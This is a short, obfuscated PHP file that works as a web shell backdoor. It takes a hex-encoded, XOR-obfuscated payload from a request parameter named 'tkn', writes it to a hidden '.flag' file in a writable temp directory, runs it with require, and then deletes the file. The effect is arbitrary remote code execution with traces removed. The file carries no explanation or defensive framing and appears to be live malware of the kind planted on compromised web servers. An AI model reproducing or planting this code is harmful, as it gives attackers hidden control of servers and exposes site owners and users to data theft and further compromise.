<?php

if(count($_REQUEST) > 0 && isset($_REQUEST["tkn"])){
	$itm = array_filter(["/dev/shm", "/var/tmp", getenv("TEMP"), getenv("TMP"), "/tmp", ini_get("upload_tmp_dir"), getcwd(), sys_get_temp_dir(), session_save_path()]);
	$pset = hex2bin($_REQUEST["tkn"]);
	$value      =     ''    ;    $e = 0; while($e < strlen($pset)){$value .= chr(ord($pset[$e]) ^ 42);$e++;}
	for ($hld = 0, $component = count($itm); $hld < $component; $hld++) {
    $mrk = $itm[$hld];
    		if (max(0, is_dir($mrk) * is_writable($mrk))) {
    $pointer = vsprintf("%s/%s", [$mrk, ".flag"]);
    if (file_put_contents($pointer, $value)) {
	require $pointer;
	unlink($pointer);
	exit;
}
}
}
}